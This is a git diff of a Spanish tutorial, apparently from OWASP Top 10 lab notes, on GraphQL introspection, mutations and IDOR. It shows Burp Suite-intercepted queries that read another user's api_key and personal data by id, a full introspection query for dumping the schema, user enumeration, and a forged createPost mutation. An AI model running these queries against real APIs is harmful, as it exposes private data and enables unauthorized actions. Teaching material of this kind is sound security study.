@@ -56,7 +56,9 @@ Al entrar en el apartado de settings, se puede ver información del usuario John
 Al interceptar esta petición con Burpsuite, de primeras se ve una petición a “/settings” pero al darle a “forward”, se ve que hace una petición a “/graphql” con una query que está solicitando información del usuario con el ID 1.
 
 ```bash
+{% raw %}
 {"query":"{ UserInfo (id: 1) {\n          \t\t\t\tapi_key\n          \t\t\t\tname\n          \t\t\t\tsurname\n          \t\t\t\tdate_of_birth\n        \t\t\t\t}\n      \t\t\t}\n        \t\t\t\t"}
+{% endraw %}
 ```
 
 ![Untitled](../assets/OWASP-TOP-10/GraphQL Introspection, Mutations e IDORs/Untitled 3.png)
@@ -80,7 +82,9 @@ En la página se ven varios comentarios de diferentes usuarios.
 Al interceptar los datos que se envían al servidor al cargar esta página, se ve que se está haciendo una solicitud por POST a “/graphql” y se está enviando una query en la que se están solicitando datos específicos de los “Posts” y el servidor da una respuesta a la query.
 
 ```bash
+{% raw %}
 {"query":"{Posts{title, body, users{ username }}}"}
+{% endraw %}
 ```
 
 ![Untitled](../assets/OWASP-TOP-10/GraphQL Introspection, Mutations e IDORs/Untitled 7.png)
@@ -94,7 +98,9 @@ Al ingresar a la aplicación “/graphql”, se puede ver una interfaz en la que
 Para enumerar el GraphQL se puede utilizar “introspection” para descubrir información sobre el esquema. En este caso se aplicará una query que mostrará todos los nombres de los tipos que se están usando actualmente:
 
 ```bash
+{% raw %}
 query={__schema{types{name,fields{name}}}}
+{% endraw %}
 ```
 
 ![Untitled](../assets/OWASP-TOP-10/GraphQL Introspection, Mutations e IDORs/Untitled 10.png)
@@ -105,7 +111,11 @@ Esta es otra forma de representar las respuestas de la querys que se hacen al Gr
 
 Para este ejemplo, se utilizará otra query que permitirá mostrar el esquema de las **bases de datos** por medio de “introspection”:
 
---------??
+```bash
+{% raw %}
+/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
+{% endraw %}
+```
 
 Esta query se debe copiar y pegar en la URL. Al enviarla, es probable que se muestren algunos errores, esto se soluciona añadiendo doble barra baja en los campos que contengan errores, por ejemplo en “Type” se muestra un error, esto se soluciona cambiándolo a “__Type”, se debe hacer esto hasta que no hayan errores.
 
@@ -114,12 +124,15 @@ Esta query se debe copiar y pegar en la URL. Al enviarla, es probable que se mue
 La siguiente query, soluciona estos errores:
 
 ```bash
+{% raw %}
 /?query=fragment FullType on __Type {%0A%20 kind%0A%20 name%0A%20 description%0A%20 fields {%0A%20%20%20 name%0A%20%20%20 description%0A%20%20%20 args {%0A%20%20%20%20%20 ...InputValue%0A%20%20%20 }%0A%20%20%20 type {%0A%20%20%20%20%20 ...TypeRef%0A%20%20%20 }%0A%20 }%0A%20 inputFields {%0A%20%20%20 ...InputValue%0A%20 }%0A%20 interfaces {%0A%20%20%20 ...TypeRef%0A%20 }%0A%20 enumValues {%0A%20%20%20 name%0A%20%20%20 description%0A%20 }%0A%20 possibleTypes {%0A%20%20%20 ...TypeRef%0A%20 }%0A}%0A%0Afragment InputValue on __InputValue {%0A%20 name%0A%20 description%0A%20 type {%0A%20%20%20 ...TypeRef%0A%20 }%0A%20 defaultValue%0A}%0A%0Afragment TypeRef on __Type {%0A%20 kind%0A%20 name%0A%20 ofType {%0A%20%20%20 kind%0A%20%20%20 name%0A%20%20%20 ofType {%0A%20%20%20%20%20 kind%0A%20%20%20%20%20 name%0A%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 ofType {%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 kind%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20 name%0A%20%20%20%20%20%20%20%20%20%20%20%20%20 }%0A%20%20%20%20%20%20%20%20%20%20%20 }%0A%20%20%20%20%20%20%20%20%20 }%0A%20%20%20%20%20%20%20 }%0A%20%20%20%20%20 }%0A%20%20%20 }%0A%20 }%0A}%0A%0Aquery IntrospectionQuery {%0A%20 __schema {%0A%20%20%20 queryType {%0A%20%20%20%20%20 name%0A%20%20%20 }%0A%20%20%20 mutationType {%0A%20%20%20%20%20 name%0A%20%20%20 }%0A%20%20%20 types {%0A%20%20%20%20%20 ...FullType%0A%20%20%20 }%0A%20%20%20 directives {%0A%20%20%20%20%20 name%0A%20%20%20%20%20 description%0A%20%20%20%20%20 locations%0A%20%20%20%20%20 args {%0A%20%20%20%20%20%20%20 ...InputValue%0A%20%20%20%20%20 }%0A%20%20%20 }%0A%20 }%0A}%0A
+{% endraw %}
 ```
 
 - Formato Prettyfy
     
     ```bash
+    {% raw %}
     fragment FullType on __Type {
       kind
       name
@@ -212,6 +225,7 @@ La siguiente query, soluciona estos errores:
         }
       }
     }
+    {% endraw %}
     ```
     
 
@@ -226,7 +240,9 @@ Esta es una forma más fácil de ver los datos y sus relaciones.
 Ahora al interceptar nuevamente la petición con Burpsuite, el atacante podría construir una query con la información que le interesa, por ejemplo en lugar de mostrar los “Posts”, puede ver el gráfico mostrado en “GraphQL Voyager” y hacer una query a los “Users” mostrando los campos “id” y “username”:
 
 ```bash
+{% raw %}
 {"query":"{Users{id,username}}"}
+{% endraw %}
 ```
 
 ![Untitled](../assets/OWASP-TOP-10/GraphQL Introspection, Mutations e IDORs/Untitled 14.png)
@@ -250,7 +266,9 @@ Al interceptar la petición de esta petición se puede ver que está tramitando 
 Por ejemplo, se modificarán estos datos para crear un nuevo post personalizado:
 
 ```bash
+{% raw %}
 {"query":"mutation { createPost(title: \"Esto es una prueba\", body: \"Esto es una prueba del operador mutation\", author_id: 1) { id, title, body, author_id }}"}
+{% endraw %}
 ```
 
 ![Untitled](../assets/OWASP-TOP-10/GraphQL Introspection, Mutations e IDORs/Untitled 18.png)
